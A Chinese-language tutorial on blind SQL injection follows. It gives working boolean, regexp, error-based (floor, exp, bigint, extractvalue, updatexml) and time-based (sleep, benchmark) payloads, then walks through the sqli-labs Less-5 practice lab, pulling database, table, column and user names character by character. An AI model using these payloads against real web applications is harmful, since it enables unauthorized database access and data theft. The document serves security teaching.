+<p>ps: 注意:  <code>table_name</code> 有好几个, 我们只得到了一个 <code>emails</code>, 如何知道其他的? 这里千万不能修改<code>limit 0,1</code>(从你的表中的第0个数据开始, 只读取一个) 为<code>limit 1,1</code>, 因为<code>limit</code> 作用在前面的 <code>select</code> 语句中, 而不是 <code>regexp</code>. 其实在 <code>regexp</code> 中我们是取匹配 <code>table_name</code> 中的内容, <strong>只要 <code>table_name</code> 中有的内 容, 我们用 <code>regexp</code> 都能够匹配到</strong>, 因此我们在使用<code>regexp</code>时, 要注意有可能有多个项, 同时要一个个字符去爆破. 因此上述语句不仅仅可以选择 <code>emails</code>, 还可以匹配其他项</p>
+</blockquote>
+<p>以下是另外两种常用用法</p>
+<pre><code class="language-sql">select * from users where id=1 and 1=(if((user() regexp '^r'),1,0));
+select * from users where id=1 and 1=(user() regexp'^r');
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019234934712.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>like匹配注入</strong></p>
+<p>和上述的正则类似, mysql 在匹配的时候我们可以用 like 进行匹配.</p>
+<p>用法:</p>
+<pre><code class="language-sql">select user() like 'ro%'
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019235206263.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>0x02 基于报错的 SQL 盲注&mdash;-构造 payload 让信息通过错误提示回显出来</strong></p>
+<p><strong><code>Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;</code></strong></p>
+<pre><code>1.一是需要 concat 计数
+2.二是 floor, 取得 0 or 1, 进行数据的 重复
+3.三是 group by 进行分组, 具体原理大致为在进行count的时候,插入了重复的key
+</code></pre>
+<ul>
+<li>以上语句可以简化成如下的形式.</li>
+</ul>
+<pre><code>select count(*) from information_schema.tables group by concat(database(), floor(rand(0)*2));
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201019235554125.png#pic_center" alt="在这里插入图片描述" />
+详情请看：<a href="https://www.zyxiao.com/p/43885" target="_blank">floor() 报错详解</a>
+<strong><code>select exp(~(select * FROM(SELECT USER())a))</code></strong></p>
+<blockquote>
+<p>double 数值类型超出范围,具体原理如下:</p>
+</blockquote>
+<p>1.当传递一个<strong>大于709</strong>的值时, 函数<code>exp()</code>就会引起一个溢出错误
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020001425508.png#pic_center" alt="在这里插入图片描述" />
+
+2.将<code>0</code>按位取反会得到<code>18446744073709551615</code>
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020001804380.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>3.<strong>mysql函数执行成功则会返回<code>0</code></strong>,我们将<strong>成功执行的函数取反</strong>就会得到最大的<code>无符号BIGINT值</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020002011889.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>4.综合上面三点,我们<strong>通过<code>子查询</code>与按位求反, 造成一个<code>DOUBLE overflow error</code>, 并借由此注出数据</strong>.</p>
+<p><strong>注：不是所有的mysql版本皆可用exp报错注入，已知==5.5.29、5.5.42==可用</strong></p>
+<pre><code class="language-sql">select exp(~(select * from (select user())a));
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020194338498.png#pic_center" alt="在这里插入图片描述" />
+
+得到表名,这里通过改变<code>limit 0,1</code>-&gt;<code>limit 1,1</code>-&gt;<code>limit 2,1</code>-&gt;<code>limit 3,1</code>-&gt; <code>limit 4,1</code>-&gt;Finish来获取不同的表</p>
+<pre><code class="language-sql">select exp(~(select * from(select table_name from information_schema.tables where table_schema=database() limit 0,1)x));
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020194932533.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>得到列名, 同样是改变limit x,y中的x,顺便提一下,x代表从第几位开始,y代表长度</li>
+</ul>
+<pre><code class="language-sql">select exp(~(select*from(select column_name from information_schema.columns where table_name='users' limit 0,1)x));
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020195246940.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li><code>exp()</code>为以 <code>e</code> 为底的对数函数;</li>
+</ul>
+<p><strong><code>select !(select * from (select user())x) -(ps:这是减号) ~0</code></strong>
+<strong>注：不是所有的mysql版本皆可用bigint报错注入，已知==5.5.29、5.5.42==可用</strong></p>
+<blockquote>
+<p><code>bigint</code> 超出范围;<code>~0</code> 是对 <code>0</code> <strong>逐位取反</strong></p>
+</blockquote>
+<ul>
+<li>数据类型<code>BIGINT</code>的长度为<strong>8字节</strong>, 也就是说, 长度为64比特. 这种数据类型<strong>最大的有符号值</strong>, 用二进制、十六进制和十进制的表示形式分别为“<code>0b0111111111111111111111111111111111111111111111111111111111111111</code>”、“<code>0x7fffffffffffffff</code>”和“<code>9223372036854775807</code>”. 当对这个值进行某些数值运算的时候, 比如加法运算, 就会引起“<code>BIGINT value is out of range</code>”错误.</li>
+</ul>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020200353629.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>为了避免出现上面这样的错误, 我们只需将其转换为<strong>无符号整数</strong>即可. 对于无符号整数来说, BIGINT可以存放的最大值用二进制、十六进制和十进制表示的话, 分别为“<code>0b1111111111111111111111111111111111111111111111111111111111111111</code>”、“<code>0xFFFFFFFFFFFFFFFF</code>”和“<code>18446744073709551615</code>”. 同样的, 如果对这个值进行数值表达式运算, 如加法或减法运算, 同样也会导致“<code>BIGINT value is out of range</code>”错误.</li>
+</ul>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020201208132.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>上面说到, 如果我们对数值<code>0</code>逐位取反, 会得到一个无符号的最大BIGINT值, 这一点是显而易见的. 所以, 如果我们对<code>~0</code>进行<code>加减运算</code>的话, 也会导致BIGINT溢出错误.</li>
+</ul>
+<blockquote>
+<p>PS:
+无符号数运算
+只有相加才有可能溢出 ,以及小减大肯定溢出,大减小不会溢出&mdash;&mdash;(参考自汇编语言)</p>
+</blockquote>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020202750126.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<blockquote>
+<p>ps: 实战中, 我们一般都是用<code>-</code>, 很少用<code>+</code>, 因为<code>+</code>容易被浏览器认为是空格</p>
+</blockquote>
+<ul>
+<li>接下来就是核心: 利用子查询引起BITINT溢出, 从而设法提取数据. 我们知道, 如果一个查询成功返回, 其返回值为0, 所以对其进行<code>逻辑非</code>的话就会变成1, 举例来说, 如果我们对类似<code>(select * from (select user())x)</code>这样的查询进行逻辑非的话, 就会有：</li>
+</ul>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020203351930.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<ul>
+<li>所以说, 只要我们能够<strong>组合</strong>好<code>逐位取反</code>和<code>逻辑取反</code>运算, 我们就能利用溢出错误来成功的注入查询</li>
+</ul>
+<pre><code class="language-sql">select !(select * from (select user())x) - ~0;
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020203650772.png#pic_center" alt="在这里插入图片描述" />
+
+<strong><code>extractvalue(1,concat(0x7e,(select @@version),0x7e))</code></strong>
+<strong>语法如下:</strong></p>
+<pre><code class="language-sql">extractvalue(目标xml文档, xml路径)
+--对XML文档进行查询的函数
+</code></pre>
+<p>第一个参数随便填, 第二个参数 <code>xml路径</code>才是可操作的地方, xml文档中查找字符位置是用斜杠隔开 <code>/xxx/xxx/xxx/…</code>这种格式, 如果我们写入其他格式, 就会报错, 并且会返回我们写入的非法格式内容, 而这个非法的内容就是我们想要查询的内容.</p>
+<p>正常查询 第二个参数的位置格式 为 <code>/xxx/xxx/</code> ,即使查询不到也不会报错</p>
+<pre><code class="language-sql">SELECT username FROM users WHERE id=1 and (extractvalue('anything','/xxx/xxx'));
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020211344530.png#pic_center" alt="在这里插入图片描述" />
+
+使用字符串连接符如<code>concat()</code>拼接 <code>/</code>, 效果和上面相同, 因为在<code>anything</code>中查询不到位置是 <code>/database()</code>的内容, 但同时也没有语法错误, 不会报错</p>
+<pre><code>SELECT username FROM users WHERE id=1 and (extractvalue('anything',concat('/',(SELECT database()))));
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020211810161.png#pic_center" alt="在这里插入图片描述" />
+下面故意写入语法错误:</p>
+<pre><code class="language-sql">SELECT username FROM users WHERE id=1 and (extractvalue('anything',concat('~',(SELECT database()))));
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020212106258.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong><code>updatexml(1,concat(0x7e,(select @@version),0x7e),1)</code></strong></p>
+<p><code>updatexml()</code>函数与<code>extractvalue()</code>类似, 是更新xml文档的函数.</p>
+<p>语法如下:</p>
+<pre><code class="language-sql">updatexml(目标xml文档, xml路径, 更新的内容)
+</code></pre>
+<p>同样地, 只需要关注第二个参数&ndash;<code>xml路径</code>, 用同样的方法进行报错即可</p>
+<pre><code class="language-sql">SELECT username FROM users WHERE id=1 and (updatexml('anything',concat('~',(SELECT database())),'anything'));
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020212536269.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>0x03 基于时间的SQL盲注&mdash;-延时注入</strong></p>
+<p><strong><code>sleep()</code></strong></p>
+<p><code>sleep()</code>函数语法如下:</p>
+<pre><code class="language-sql">SLEEP(duration)
+-- 睡眠(暂停)时间为duration参数给定的秒数, 然后返回0. 若SLEEP()被中断, 它会返回1
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020212918944.png#pic_center" alt="在这里插入图片描述" />
+有了延迟函数之后, 我们通常需要配合<code>IF()</code>语句以及字符串截取函数, 如下:</p>
+<pre><code class="language-sql">SELECT * FROM users WHERE id=1 AND IF((substr((SELECT username FROM users WHERE id=1),1,1))='D',sleep(3),0);
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020213241571.png#pic_center" alt="在这里插入图片描述" />
+
+可以看到, 正确则延迟了3s, 不正确则立刻返回</p>
+<p><strong><code>benchmark()</code></strong></p>
+<p><strong>语法如下:</strong></p>
+<p>benchmark(count, expr)
+&ndash;重复执行count次表达式expr, 结果值通常为0</p>
+<p>因为函数执行次数比较大, 所以返回结果的时间比平时要长, 因此可以通过时间长短的变化, 判断语句是否执行成功</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020213741907.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>因此上面<code>sleep()</code>的例子可以修改成如下:</p>
+<pre><code class="language-sql">SELECT * FROM users WHERE id=1 AND IF((substr((SELECT username FROM users WHERE id=1),1,1))='D',benchmark(10000000, sha(1)),0);
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020214001179.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<table>
+<thead>
+<tr>
+<th>数据库</th>
+<th>延迟用的函数</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>mysql</td>
+<td>BENCHMARK(100000,MD5(1)) or sleep(5)</td>
+</tr>
+<tr>
+<td>Postgresql</td>
+<td>PG_SLEEP(5) or GENERATE_SERIES(1,10000)</td>
+</tr>
+<tr>
+<td>mssql</td>
+<td>WAITFOR DELAY &lsquo;0:0:5&rsquo;</td>
+</tr>
+</tbody>
+</table>
+<h4 id="解题篇">解题篇</h4>
+<p><strong>1.0 测试</strong></p>
+<pre><code class="language-sql">hhttp://localhost/sqli-labs-master/Less-5/?id=1
+</code></pre>
+<p>注意：此时不再是的用户名和密码显示的结果了；</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020231950427.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>单引号测试：</strong></p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1'
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020232215305.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1'--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020232317774.png#pic_center" alt="在这里插入图片描述" />
+
+我们使用盲注中常使用的方法进行探测；以下进行<strong>三种盲注</strong>进行测试；</p>
+<p><strong>二、布尔型盲注</strong></p>
+<p><strong>2.1</strong>  <strong>left()函数</strong></p>
+<p>格式：</p>
+<p>left(str,1)&gt;5</p>
+<p>解析：str是字符串，可能是版本号，可能是数据库名等；1：指的是从字符串中获取第一个字符，如果想获取第二个字符，直接修改次数字就行，但是，注意：后面比较的数字要写上我们探测的第一个字符信息；</p>
+<p>例如：</p>
+<p>Database()=‘security’实际值；</p>
+<p>Left(database(),1)&gt;’s’  没有爆错并测出第一个字符是’s’</p>
+<p>Left(database(),2)&gt;’sh’  需要加第一个字符，否则会爆错的；</p>
+<p><strong>2.1.1   数据库版本探测</strong></p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/?id=1' and left(version(),1)=6--+
+</code></pre>
+<p>解析：探测目录数据库版本信息，第一个字符是否是6，报错</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020102023320058.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left(version(),1)=5--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020233340219.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>2.1.2   数据库长度判断</strong></p>
+<p>使用<strong>length</strong>进行长度探测；</p>
+<p>URL：</p>
+<p>探测是否大于10，</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and length(database())&gt;10--+ 
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020233700810.png#pic_center" alt="在这里插入图片描述" />
+
+尝试修改大小直到得知数据库长度；这里长度：8</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and length(database())=8--+ 
+</code></pre>
+<p>得知数据库的长度为8后，那么我们就可以探测每个字符是什么，直到获取完整数据库名；</p>
+<p><strong>2.1.3   爆数据库名</strong></p>
+<p>从探测版本信息得知，可以利用left()函数实现字符探测，当然不止此函数，还有其他类，后面会一一测试；</p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left(database(),1)&gt;a--+
+</code></pre>
+<p>发现报错了，<strong>注意</strong>：在mysql中数据库字符是string类型，要把a使用’a’包含</p>
+<p>解析：探测数据库名，第一个字符是否是大于’a’，如果You are in…….正常显示，说明至少是大于‘a’，反之，不正确；</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020234031879.png#pic_center" alt="在这里插入图片描述" />
+
+URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left(database(),1)&gt;'t'--+
+</code></pre>
+<p>报错，说明第一个字符是小于字符’t’,需要一步一步探测；’security’，每一步我们不做测试；</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020234320581.png#pic_center" alt="在这里插入图片描述" />
+
+测试第二个字符；</p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left(database(),2)&gt;'sh’--+
+</code></pre>
+<p>解析：探测数据库第二个字符，记得要加上探测出来的第一个字符；</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020234613976.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left(database(),2)='se'--+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020234850543.png#pic_center" alt="在这里插入图片描述" />
+
+后面同理</p>
+<p><strong>2.1.4</strong>  <strong>爆表名</strong></p>
+<p>从上面我们已经获取数据库信息，</p>
+<p><strong>第一个表第一个字符</strong></p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left((select table_name from information_schema.tables where  table_schema='security' limit 0,1),1) ='e' --+ 
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020235332209.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>第四张表第一个字符</strong></p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left((select table_name from information_schema.tables where  table_schema='security' limit 3,1),1) ='u' --+ 
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020235606517.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>第四张表第二个字符</strong></p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left((select table_name from information_schema.tables where  table_schema='security' limit 3,1),2) ='us' --+ 
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201020235818358.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>第四张表第三个字符</strong></p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left((select table_name from information_schema.tables where  table_schema='security' limit 3,1),3) ='use' --+ 
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020102023595130.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>然后；</p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and  left((select table_name from information_schema.tables where  table_schema='security' limit 3,1),4) ='user' --+
+</code></pre>
+<p>然后：</p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left((select table_name from information_schema.tables where  table_schema='security' limit 3,1),5) ='users' --+
+</code></pre>
+<p>然后：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left((select table_name from information_schema.tables where  table_schema='security' limit 3,1),6) &gt;'usersa' --+
+</code></pre>
+<p>如果第六个字符，最小都没有大于a或其他字符，说明长度只有5个字符长度；</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021000326398.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>2.1.5</strong>  <strong>爆字段名</strong></p>
+<p>从以上步骤可以很轻松获取数据库表名；下面我们使用相同方式继续获取想要的字段名；</p>
+<p>URL：利用报错获取字段名；</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left((select column_name from information_schema.columns where  table_name='users' limit 0,1),1) &gt;'h' --+ 
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021000636433.png#pic_center" alt="在这里插入图片描述" />
+
+第一个字符是&rsquo;<code>i</code>'，记得要带到第二个查询中；</p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left((select column_name from information_schema.columns where  table_name='users' limit 0,1),2) &gt;'if' --+ 
+</code></pre>
+<p>这里发现，居然显示<code>You are in........</code></p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021071231976.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>然后发现这里居然报错了&hellip;</strong></p>
+<p>URL</p>
+<pre><code class="language-SQL">http://localhost/sqli-labs-master/Less-5/?id=1'and left((select column_name from information_schema.columns where  table_name='users' limit 0,1),2) ='id' --+ 
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021071630319.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>原来，只需要加上数据库的限定条件就可以</strong></p>
+<p>URL</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left((select column_name from information_schema.columns where table_name='users' and  table_schema='security' limit 0,1),2)&gt;'if' --+ 
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021071927756.png#pic_center" alt="在这里插入图片描述" />
+
+得知，第二个字符’d’，尝试获取第三个字符时直接报错了，说明长度为2</p>
+<p>然后：</p>
+<p><strong>第二个字段的字符；</strong></p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left((select column_name from information_schema.columns where  table_name='users' and  table_schema='security' limit 1,1),2) &gt;'t' --+ 
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021072203196.png#pic_center" alt="在这里插入图片描述" />
+
+后面继续修改数字和字符串即可；</p>
+<p><strong>2.1.6</strong>  <strong>爆字段数据</strong></p>
+<p>从上面我们已经获得：id、username、password三个字段；</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left((select username from security.users where id=1),1) &gt;'a' --+
+</code></pre>
+<p>或：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left((select username from security.users limit 0,1),1) &gt;'a' --+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/202010210727412.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>然后</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left((select username from security.users where id=1),1) ='d' --+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021072850399.png#pic_center" alt="在这里插入图片描述" />
+
+第一个字符&rsquo;d&rsquo;备注：mysql中大小写是不区分的，一般会认为是小写字符；</p>
+<p>第二个字符’u’</p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left((select username from security.users where id=1),2) ='du' --+
+</code></pre>
+<p>或</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and left((select username from security.users limit 0,1),2) ='du' --+
+</code></pre>
+<p><strong>2.2  ascii和substr函数</strong></p>
+<p>语法：</p>
+<blockquote>
+<p>ascii(string)&gt;ascii码             // ascii转换作用，并与外部进行比较；</p>
+<p>substr(string, start, length)     // 从字符串开始的数字，取出长度为 length长度的字符；</p>
+</blockquote>
+<p>下面就利用此paylaod进行获取库中表名：</p>
+<pre><code class="language-sql">ascii(substr((select table_name from information_schema.tables where tables_schema=database() limit 0,1),1,1))=101
+</code></pre>
+<p>//注意：database()已经通过以上方式可以获得；</p>
+<p><strong>2.2.1</strong>  <strong>ascii和substr函数猜解数据库字段信息</strong></p>
+<p>也可以通过此方式获得数据库字符信息；但是由于查询后所获得的数据库第一个一般都是mysql数据库默认数据库；</p>
+<p>默认数据库：</p>
+<p>information_schema</p>
+<p>mysql</p>
+<p>performance_schema</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021073344770.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>例如：</p>
+<p><strong>第六个数据库，第一个字符</strong></p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select schema_name from information_schema.schemata limit 5,1),1,1))=115 --+ 
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021073803726.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>第六个数据库，第二个字符</strong></p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select schema_name from information_schema.schemata limit 5,1),2,1))=101 --+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021074747969.png#pic_center" alt="在这里插入图片描述" />
+
+局限性：</p>
+<p>1、我们需要的数据库位置不知道，爆出我们想要数据需浪费时间；</p>
+<p>在2.1中已经爆出数据库名；下面需要继续获取表和字段信息；</p>
+<p><strong>2.2.2</strong>  <strong>爆表</strong></p>
+<p><strong>爆第一个表</strong></p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables  where table_schema='security' limit 0,1),1,1))=101--+
+</code></pre>
+<p>101—&gt;e</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021075101678.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>解析：首先通过substr函数获取第一个表的第一个字符，再通过ascii函数转换为ascii码进行比较来判断字符信息；</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021075517533.png#pic_center" alt="在这里插入图片描述" />
+
+<strong>爆出第一个表的第二个字符</strong></p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables  where table_schema='security' limit 0,1),2,1))=109--+
+</code></pre>
+<p>109—&gt;m</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/2020102107565660.png#pic_center" alt="在这里插入图片描述" />
+
+通过以上方式可以爆出第一个表：emails</p>
+<p><strong>爆出第二个表第一个字符：</strong></p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables  where table_schema='security' limit 1,1),1,1))&gt;113--+
+</code></pre>
+<p>观察URL：得知，如果想获取第二表，通过修改<strong>limit 0,1</strong>来再进行substr进行截取字符；</p>
+<p>113—&gt;r；由下图可以得知，第二张表的第一个字符是’r’</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021075940739.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021080009972.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p><strong>爆出第二表的第二个字符：</strong></p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables  where table_schema='security' limit 1,1),2,1))=101 --+
+</code></pre>
+<p>从第一个字符的URL，和第二个字符中URL得知，修改后面部分获取其信息；直到获取我们想要的信息；</p>
+<p>爆出第四个表第一个字符：</p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables  where table_schema='security' limit 3,1),1,1))=117 --+
+</code></pre>
+<p>117—&gt;’u’;表为：users</p>
+<p><strong>爆出第四表的第六个字符：备注：长度只有5个，不管多大字符都会报错，所以如果超过长度都会出现报错；</strong></p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables  where table_schema='security' limit 3,1),6,1))&gt;0 --+
+</code></pre>
+<p><strong>2.2.3</strong>  <strong>爆字段名</strong></p>
+<p>从上面我们知道了，我们已经得知表名；</p>
+<p>第一个字段第一个字符：</p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select column_name from information_schema.columns  where table_name='users' and TABLE_SCHEMA='security' limit 0,1),1,1))=105 --+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021080514313.png#pic_center" alt="在这里插入图片描述" />
+
+其他继续就行</p>
+<p><strong>2.3.4</strong>  <strong>爆字段数据</strong></p>
+<p>从上面爆出字段名得知，id、usename、password</p>
+<p>URL：     ascii编码是有大小写区分的，大小写相差32；我们知道left函数不具有大小写区分的，所以无法判断大小写；建议使用ascii进行爆破；</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select username from security.users where id=1),1,1))=68 --+
+</code></pre>
+<p>68—&gt;D
+<img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021080741544.png#pic_center" alt="在这里插入图片描述" />
+
+第一个字段第二个字符</p>
+<p>URL：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select username from security.users where id=1),2,1))=117 --+
+</code></pre>
+<p>或：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and ascii(substr((select username from security.users limit 0,1),2,1))=117 --+
+</code></pre>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021081152178.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>117—&gt;u</p>
+<p>后面同理；</p>
+<p><strong>2.3</strong>  <strong>regexp正则获取字段信息</strong></p>
+<p>通过上面方法我们已经获取数据库和表，此时就是获取字段信息；而，正则表达式法，主要是利用布尔型进行比较；</p>
+<p>格式：regexp ‘^…&rsquo;</p>
+<p><strong>爆第一个字段名：</strong></p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1) --+
+</code></pre>
+<p>解析：由上面得知，存在users表，使用regexp正则，探测字段名；</p>
+<p><img class="img-zoomable" src="https://img-blog.csdnimg.cn/20201021081412145.png#pic_center" alt="在这里插入图片描述" />
+</p>
+<p>爆第二个字段名：</p>
+<pre><code class="language-sql">http://localhost/sqli-labs-master/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^password' limit 0,1) --+
+</code></pre>
